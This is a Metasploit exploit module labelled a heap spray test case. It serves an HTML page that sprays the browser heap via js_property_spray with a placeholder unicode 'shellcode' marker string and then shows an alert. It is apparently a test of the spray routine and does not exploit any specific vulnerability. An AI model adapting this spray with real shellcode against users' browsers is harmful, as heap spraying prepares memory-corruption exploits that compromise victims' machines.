require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = NormalRanking

        include Msf::Exploit::Remote::HttpServer::HTML

        def initialize(info={})
                super(update_info(info,
                        'Name'           => "Heap Spray Test Case",
                        'Description'    => %q{ Heap Spray Test Case },
                        'License'        => MSF_LICENSE,
                        'Author'         => [ 'sinn3r' ],
                        'References'     => [ [ 'URL', 'https://community.rapid7.com/community/metasploit/blog' ] ],
                        'Platform'       => 'win',
                        'Targets'        => [ [ 'Automatic', {} ] ],
                        'Privileged'     => false,
                        'DisclosureDate' => "Mar 03 2013",
                        'DefaultTarget'  => 0))
        end

        def load_spray_html(cli, req)
                spray = js_property_spray

                html = %Q|
                <html>
                <head></head>
                <body>
                <script>
                #{spray}
 
                var s = unescape("%u5247%u5941%u4148%u5F54%u4148%u4B43%u4E49%u5F47%u5434%u2148");
                sprayHeap({shellcode:s});
                alert("done");
                </script>
                </body>
                </html>
                |

                return html
        end

        def on_request_uri(cli, request)
                html = load_spray_html(cli, request)
                html = html.gsub(/^\t\t/, '')
                print_status("Sending HTML...")
                send_response(cli, html, {'Content-Type'=>'text/html'})
        end

end
